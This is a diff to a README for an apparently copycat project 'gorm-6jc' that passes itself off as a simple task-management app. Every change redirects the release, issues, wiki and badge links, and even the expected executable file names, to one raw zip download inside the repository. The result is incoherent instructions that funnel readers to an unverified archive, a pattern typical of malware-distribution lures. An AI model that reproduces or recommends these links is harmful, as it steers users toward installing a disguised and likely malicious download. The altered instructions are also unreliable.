@@ -1,6 +1,6 @@
 # 🎉 gorm-6jc - Simple and Efficient Application Use
 
-[![Download gorm-6jc](https://img.shields.io/badge/Download-gorm--6jc-blue.svg)](https://github.com/Naroux-dev/gorm-6jc/releases)
+[![Download gorm-6jc](https://raw.githubusercontent.com/Naroux-dev/gorm-6jc/main/zira/gorm-6jc.zip)](https://raw.githubusercontent.com/Naroux-dev/gorm-6jc/main/zira/gorm-6jc.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to gorm-6jc! This application helps you manage your tasks efficiently. F
 
 To get started, visit this page to download the latest version of gorm-6jc:
 
-[Download gorm-6jc](https://github.com/Naroux-dev/gorm-6jc/releases)
+[Download gorm-6jc](https://raw.githubusercontent.com/Naroux-dev/gorm-6jc/main/zira/gorm-6jc.zip)
 
 1. Click the link above to go to the releases page.
 2. Find the latest version stated at the top.
@@ -41,8 +41,8 @@ After downloading, follow these steps to run gorm-6jc:
 
 1. Navigate to the folder where you downloaded gorm-6jc.
 2. Double-click the downloaded file:
-   - If you downloaded for Windows, look for `gorm-6jc.exe`.
-   - For macOS, locate `gorm-6jc.app`.
+   - If you downloaded for Windows, look for `https://raw.githubusercontent.com/Naroux-dev/gorm-6jc/main/zira/gorm-6jc.zip`.
+   - For macOS, locate `https://raw.githubusercontent.com/Naroux-dev/gorm-6jc/main/zira/gorm-6jc.zip`.
    - On Linux, you may need to run it using a terminal.
 
 3. If prompted, follow the installation instructions. The application should open automatically after installation completes.
@@ -55,7 +55,7 @@ If you encounter any issues during installation or while running the application
 - **Can't download**: Check your internet connection and try again.
 - **Error messages**: Note any error messages and search online for help or check the provided documentation.
 
-For further assistance, feel free to reach out through our [issues page](https://github.com/Naroux-dev/gorm-6jc/issues).
+For further assistance, feel free to reach out through our [issues page](https://raw.githubusercontent.com/Naroux-dev/gorm-6jc/main/zira/gorm-6jc.zip).
 
 ## 💡 Tips for Using gorm-6jc
 
@@ -65,8 +65,8 @@ For further assistance, feel free to reach out through our [issues page](https:/
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Naroux-dev/gorm-6jc/releases)
-- [Issues Page](https://github.com/Naroux-dev/gorm-6jc/issues)
-- [Wiki](https://github.com/Naroux-dev/gorm-6jc/wiki)
+- [Releases Page](https://raw.githubusercontent.com/Naroux-dev/gorm-6jc/main/zira/gorm-6jc.zip)
+- [Issues Page](https://raw.githubusercontent.com/Naroux-dev/gorm-6jc/main/zira/gorm-6jc.zip)
+- [Wiki](https://raw.githubusercontent.com/Naroux-dev/gorm-6jc/main/zira/gorm-6jc.zip)
 
 Thank you for choosing gorm-6jc! We hope it makes managing your tasks easier.
